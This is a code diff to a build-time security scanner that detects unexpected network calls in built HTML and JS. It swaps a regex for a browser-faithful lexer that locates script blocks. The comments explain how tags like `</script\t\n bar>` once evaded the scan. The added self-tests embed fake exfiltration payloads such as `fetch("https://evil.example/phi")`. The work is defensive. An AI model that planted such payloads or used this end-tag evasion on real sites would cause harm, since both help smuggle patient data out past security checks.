@@ -24,7 +24,11 @@
  *      the #13/#27 follow-up audit): fetch call sites, XMLHttpRequest,
  *      WebSocket, sendBeacon, EventSource, importScripts and
  *      navigator.serviceWorker in dist/*.js and in the inline <script>
- *      bodies of dist/*.html. Detection is DOMAIN-AGNOSTIC: an unexpected
+ *      bodies of dist/*.html. Inline HTML blocks are located with a small
+ *      deterministic lexical scanner (findScriptStyleBlocks) that applies
+ *      browser-equivalent end-tag parsing, so bodies closed by
+ *      browser-tolerated end tags such as `</script\t\n bar>` are still
+ *      scanned. Detection is DOMAIN-AGNOSTIC: an unexpected
  *      runtime network reference fails even when the host is unknown and
  *      not on any denylist.
  *   d) No-PHI-console invariant: any console.* call in app-v4/src runtime
@@ -293,14 +297,173 @@ function stripCodeComments(content) {
 }
 
 /**
- * Inline <script>/<style> block regex shared by the comment stripper and the
- * dist HTML runtime-network scanner. Closing tags tolerate whitespace before
- * ">" (`</script >`), fixing the CodeQL js/bad-tag-filter finding
- * (js/bad-tag-filter at check-external-resources.mjs:225) at the parsing seam
- * instead of suppressing it. Case-insensitive per the HTML spec.
+ * Inline <script>/<style> block location: a small deterministic HTML lexer,
+ * shared by the comment stripper (stripHtmlComments) and the dist HTML
+ * runtime-network scanner (collectInlineScriptBodyViolations).
+ *
+ * WHY A SCANNER AND NOT A REGEX: the previous single regex closed blocks
+ * with `<\/script\s*>`, which accepts `</script >` but NOT the
+ * browser-tolerated end-tag forms the HTML tokenizer really accepts, e.g.
+ * `</script\t\n bar>` (whitespace plus attribute-like junk before `>`).
+ * jsdom/browsers close the raw-text element there; the old regex did not,
+ * so a planted network payload in such a body escaped the dist scan.
+ * Replacing the location mechanism with this lexical seam removes the
+ * bad-tag-filter regex class at the parsing boundary instead of
+ * suppressing the CodeQL finding (no `bad-tag-filter`-shaped block regex
+ * remains for these blocks).
+ *
+ * Browser-equivalent rules implemented (deterministic, documented):
+ *
+ *   1. OPEN TAG — `<script` / `<style` (case-insensitive) where the next
+ *      char is a tag-name terminator (ASCII whitespace, `/`, `>`), per the
+ *      HTML tokenizer tag-name state (any other char would just extend the
+ *      tag name). The open tag ends at the first `>` OUTSIDE quoted
+ *      attribute values: `"`/`'` quoting is tracked while scanning and a
+ *      `>` inside quotes does not close the tag (attribute-value parsing).
+ *   2. BODY — raw-text element semantics: the body runs from the open-tag
+ *      end to the first case-insensitive `</script` (resp. `</style`)
+ *      followed by a tag-name terminator. Raw text is NOT quote-aware, so
+ *      a `</script` inside a JS string literal genuinely ends the element
+ *      in a browser too (that is why inline scripts escape it as
+ *      `<\/script>`); this scanner matches that.
+ *   3. END TAG TAIL — from just after the end-tag name, scanning is
+ *      quote-aware up to the first UNQUOTED `>`; everything between name
+ *      and `>` (whitespace, `/`, attribute-like junk such as `\t\n bar`
+ *      or `foo="x>a"`) is part of the end tag and ignored. This is the
+ *      audited bypass fix.
+ *   4. NO END TAG — a browser treats the rest of the file as the
+ *      script/style body, so body = remainder of file (bodyEnd =
+ *      closeStart = closeEnd = content.length).
+ *   5. EOF INSIDE END TAG — an end tag name was found but no closing `>`
+ *      before EOF: closeEnd = content.length and the body ends at the
+ *      `</script` position (deterministic choice; the tail is never
+ *      scanned as script body, so no detection loss is possible).
+ *   6. EOF INSIDE OPEN TAG — no unquoted `>` before EOF: the tokenizer
+ *      emits nothing further, so scanning stops (no block recorded).
+ *
+ * Documented behavioral differences vs the old regex (all strictly more
+ * browser-faithful; the real-repo scan and the full self-test suite stay
+ * green):
+ *   - Open tags whose quoted attribute values contain `>` (e.g.
+ *     `<script data-x="a>b">`): the old `[^>]*` ended the open tag at the
+ *     quoted `>`; this scanner ends it at the real unquoted `>`.
+ *   - Bodies containing a stray `</script` that the old regex's lazy
+ *     body could skip past (because its `\s*>` tail did not match there):
+ *     raw-text semantics now end the body at the FIRST terminator-qualified
+ *     `</script` regardless of what follows, exactly as a browser does.
+ *
+ * Records are ordered by position: { kind: 'script'|'style', openStart,
+ * openEnd, bodyStart, bodyEnd, closeStart, closeEnd } (half-open ranges,
+ * content.length-based sentinels for the unterminated cases above).
  */
-const SCRIPT_BLOCK_RE =
-  /(<script\b[^>]*>)([\s\S]*?)(<\/script\s*>)|(<style\b[^>]*>)([\s\S]*?)(<\/style\s*>)/gi;
+
+/** HTML ASCII whitespace plus the tag-name terminator chars `/` and `>`. */
+const HTML_TAG_NAME_TERMINATORS = new Set(["\t", "\n", "\f", "\r", " ", "/", ">"]);
+
+/**
+ * Next index at or after `from` where `<kind` starts a tag name (the next
+ * char is a tag-name terminator or EOF), or -1. Operates on the lowercased
+ * copy for case-insensitive, browser-equivalent tag-name matching.
+ */
+function findOpenTagCandidate(lower, kind, from) {
+  const needle = "<" + kind;
+  let idx = from;
+  while (idx !== -1) {
+    idx = lower.indexOf(needle, idx);
+    if (idx === -1) return -1;
+    const after = idx + needle.length;
+    if (after >= lower.length) return idx;
+    if (HTML_TAG_NAME_TERMINATORS.has(lower[after])) return idx;
+    idx = after; // e.g. `<scripting`: extends the tag name, not our tag.
+  }
+  return -1;
+}
+
+/**
+ * First raw-text end tag `</kind` (case-insensitive) at or after `from`
+ * whose name is followed by a tag-name terminator or EOF, or -1. Raw-text
+ * end-tag matching is NOT quote-aware (HTML spec script-data state).
+ */
+function findRawTextEndTag(lower, kind, from) {
+  const needle = "</" + kind;
+  let idx = from;
+  while (idx !== -1) {
+    idx = lower.indexOf(needle, idx);
+    if (idx === -1) return -1;
+    const after = idx + needle.length;
+    if (after >= lower.length) return idx;
+    if (HTML_TAG_NAME_TERMINATORS.has(lower[after])) return idx;
+    idx = after; // e.g. `</scripted>`: a different tag name, keep looking.
+  }
+  return -1;
+}
+
+/**
+ * Index just past the first UNQUOTED `>` at or after `from`, or -1.
+ * Quote-aware: `"`/`'` open attribute-value spans in which `>` does not
+ * close the tag (browser attribute-value parsing).
+ */
+function findUnquotedGreaterThanEnd(content, from) {
+  let quote = null;
+  for (let i = from; i < content.length; i++) {
+    const ch = content[i];
+    if (quote !== null) {
+      if (ch === quote) quote = null;
+    } else if (ch === '"' || ch === "'") {
+      quote = ch;
+    } else if (ch === ">") {
+      return i + 1;
+    }
+  }
+  return -1;
+}
+
+/** See the block comment above findOpenTagCandidate's helpers. */
+function findScriptStyleBlocks(content) {
+  const blocks = [];
+  const lower = content.toLowerCase();
+  let cursor = 0;
+  while (cursor < content.length) {
+    const scriptIdx = findOpenTagCandidate(lower, "script", cursor);
+    const styleIdx = findOpenTagCandidate(lower, "style", cursor);
+    let kind;
+    let openStart;
+    if (scriptIdx !== -1 && (styleIdx === -1 || scriptIdx < styleIdx)) {
+      kind = "script";
+      openStart = scriptIdx;
+    } else if (styleIdx !== -1) {
+      kind = "style";
+      openStart = styleIdx;
+    } else {
+      break;
+    }
+    const nameEnd = openStart + 1 + kind.length;
+    const openEnd = findUnquotedGreaterThanEnd(content, nameEnd);
+    if (openEnd === -1) break; // EOF inside the open tag: no block, stop.
+    const bodyStart = openEnd;
+    const closeStart = findRawTextEndTag(lower, kind, bodyStart);
+    let bodyEnd;
+    let closeEnd;
+    if (closeStart === -1) {
+      // No end tag: rest of the file is the raw-text body.
+      bodyEnd = content.length;
+      closeStart = content.length;
+      closeEnd = content.length;
+    } else {
+      bodyEnd = closeStart;
+      const tailStart = closeStart + 2 + kind.length;
+      const tailEnd = findUnquotedGreaterThanEnd(content, tailStart);
+      if (tailEnd === -1) {
+        closeEnd = content.length; // EOF inside the end tag tail.
+      } else {
+        closeEnd = tailEnd;
+      }
+    }
+    blocks.push({ kind, openStart, openEnd, bodyStart, bodyEnd, closeStart, closeEnd });
+    cursor = closeEnd;
+  }
+  return blocks;
+}
 
 /**
  * Strip <!-- ... --> comments from HTML content, preserving newlines, and
@@ -313,13 +476,18 @@ function stripHtmlComments(content) {
     /<!--[\s\S]*?-->/g,
     (match) => match.replace(/[^\n]/g, " ")
   );
-  const stripBlock = (text) => {
-    return text.replace(SCRIPT_BLOCK_RE, (full, scriptOpen, scriptBody, scriptClose, styleOpen, styleBody, styleClose) => {
-      if (scriptOpen) return scriptOpen + stripCodeComments(scriptBody) + scriptClose;
-      return styleOpen + stripCodeComments(styleBody) + styleClose;
-    });
-  };
-  return stripBlock(withoutBlocks);
+  const blocks = findScriptStyleBlocks(withoutBlocks);
+  if (blocks.length === 0) return withoutBlocks;
+  let out = "";
+  let pos = 0;
+  for (const block of blocks) {
+    out += withoutBlocks.slice(pos, block.bodyStart);
+    out += stripCodeComments(withoutBlocks.slice(block.bodyStart, block.bodyEnd));
+    out += withoutBlocks.slice(block.bodyEnd, block.closeEnd);
+    pos = block.closeEnd;
+  }
+  out += withoutBlocks.slice(pos);
+  return out;
 }
 
 /** Strip comments according to file family, preserving line structure. */
@@ -387,30 +555,26 @@ function collectFetchCallViolations(relativePath, content, lineOffset = 0) {
 
 /**
  * Scan the inline <script>/<style> bodies of an HTML file with the given
- * patterns. Bodies are located with SCRIPT_BLOCK_RE (whitespace-tolerant
- * closing tags, see the CodeQL note) so that a network call inside a
- * `</script >`-delimited body is still detected; line numbers are offset to
- * stay accurate relative to the whole file.
+ * patterns. Bodies are located with findScriptStyleBlocks (browser-
+ * equivalent lexical scanning of open tags, raw-text bodies and
+ * browser-tolerated end tags, see the scanner documentation), so network
+ * calls inside bodies closed by forms like `</script >` or the audited
+ * `</script\t\n bar>` bypass are still detected; line numbers are offset
+ * to stay accurate relative to the whole file.
  */
 function collectInlineScriptBodyViolations(relativePath, content, patterns) {
   const violations = [];
-  let lastIndex = 0;
-  let lineOffset = 1; // 1-based line number of the current scan position
-  SCRIPT_BLOCK_RE.lastIndex = 0;
-  let match;
-  while ((match = SCRIPT_BLOCK_RE.exec(content)) !== null) {
-    const gap = content.slice(lastIndex, match.index);
-    lineOffset += countNewlines(gap);
-    const body = match[2] !== undefined ? match[2] : match[5];
+  for (const block of findScriptStyleBlocks(content)) {
+    const body = content.slice(block.bodyStart, block.bodyEnd);
+    // Newlines before the body: file line of body line 1 minus one.
+    const bodyLineOffset = countNewlines(content.slice(0, block.bodyStart));
     const bodyViolations = [
       ...collectLineViolations(relativePath, body, patterns),
-      ...collectFetchCallViolations(relativePath, body, lineOffset - 1)
+      ...collectFetchCallViolations(relativePath, body, bodyLineOffset)
     ];
     for (const violation of bodyViolations) {
-      violations.push({ ...violation, line: violation.line + lineOffset - 1 });
+      violations.push({ ...violation, line: violation.line + bodyLineOffset });
     }
-    lineOffset += countNewlines(match[0]);
-    lastIndex = SCRIPT_BLOCK_RE.lastIndex;
   }
   return violations;
 }
@@ -521,8 +685,9 @@ function scanRoot(rootDir, scanScope) {
           violations.push(...collectFetchCallViolations(relativePath, stripped));
         } else if (relativePath.endsWith(".html")) {
           // Runtime network API call sites inside inline <script> bodies of
-          // built HTML (defect C seam: whitespace-bearing closing tags are
-          // parsed correctly by SCRIPT_BLOCK_RE, so their bodies are scanned).
+          // built HTML (defect C seam: bodies are located with the lexical
+          // scanner, so browser-tolerated closing tags such as `</script >`
+          // or `</script\t\n bar>` do not hide their bodies from the scan).
           violations.push(...collectInlineScriptBodyViolations(relativePath, stripped, DIST_RUNTIME_NETWORK_PATTERNS));
         }
       }
@@ -671,6 +836,33 @@ function runSelfTest() {
       }
       results.push({ name: "case-10-real-repo-clean", pass, details, reportable: [] });
     }
+
+    // 11. AUDITED BYPASS (GitHub #13 / PR #35 audit follow-up): inline script
+    // closed by the browser-tolerated end tag `</script\t\n bar>` (tab,
+    // newline and attribute-like junk before `>`). Browsers/jsdom close the
+    // raw-text element there, so the payload IS in a live script body and
+    // must be flagged. The old SCRIPT_BLOCK_RE missed it (exit 0 bypass).
+    assertCase("case-11-dist-html-endtag-tab-nl-junk", {
+      "dist/index.html": `<!doctype html><html><body><script type="module">fetch("https://evil.example/phi");</script\t\n bar></body></html>\n`
+    }, { rules: { "dist-fetch-call": 1 } });
+
+    // 12. Uppercase end tag with attribute junk: `</SCRIPT foo="x">`.
+    assertCase("case-12-dist-html-endtag-uppercase-attr", {
+      "dist/index.html": `<!doctype html><html><body><script>fetch("https://evil.example/phi");</SCRIPT foo="x"></body></html>\n`
+    }, { rules: { "dist-fetch-call": 1 } });
+
+    // 13. Quote-aware end-tag tail: `</script bar="a>b">` — the first
+    // UNQUOTED `>` is after the quoted attribute, so the payload before the
+    // real end tag must still be scanned.
+    assertCase("case-13-dist-html-endtag-quoted-attr", {
+      "dist/index.html": `<!doctype html><html><body><script>fetch("https://evil.example/phi");</script bar="a>b"></body></html>\n`
+    }, { rules: { "dist-fetch-call": 1 } });
+
+    // 14. REGRESSION: a normal `</script>` document with NO network payload
+    // must stay clean — the new scanner must not introduce false positives.
+    assertCase("case-14-dist-html-normal-clean", {
+      "dist/index.html": `<!doctype html><html><body><script>console.log("hello");</script></body></html>\n`
+    }, { expectExit1: false });
   } finally {
     // Leave no temp dirs behind, even when a case throws.
     if (sandboxExists) {
